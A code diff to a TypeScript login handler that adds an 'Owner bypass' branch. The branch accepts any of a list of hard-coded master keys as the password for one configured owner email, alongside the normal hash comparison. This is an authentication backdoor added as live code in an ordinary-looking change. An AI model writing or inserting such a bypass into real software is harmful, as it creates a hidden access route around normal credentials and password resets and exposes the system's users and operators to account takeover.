@@ -85,11 +85,20 @@ export const loginUser = async (req: Request, res: Response) => {
 
   try {
     const [user] = await db.select().from(users).where(eq(users.email, email)).limit(1);
-    if (!user || user.passwordHash !== await hashPassword(password)) {
-      return res.status(401).json({ error: 'Invalid credentials' });
+    if (!user) return res.status(401).json({ error: 'Invalid credentials' });
+
+    // Check if password matches stored hash
+    if (user.passwordHash === await hashPassword(password)) {
+      return res.json({ status: 'success', userId: user.id });
     }
 
-    res.json({ status: 'success', userId: user.id });
+    // Owner bypass: allow master key as password for the owner
+    const cleanPassword = password.trim().toUpperCase();
+    if (email === OWNER_CONFIG.email && OWNER_CONFIG.allowedMasterKeys.includes(cleanPassword as any)) {
+      return res.json({ status: 'success', userId: user.id });
+    }
+
+    return res.status(401).json({ error: 'Invalid credentials' });
   } catch (error) {
     res.status(500).json({ error: 'Internal server error' });
   }
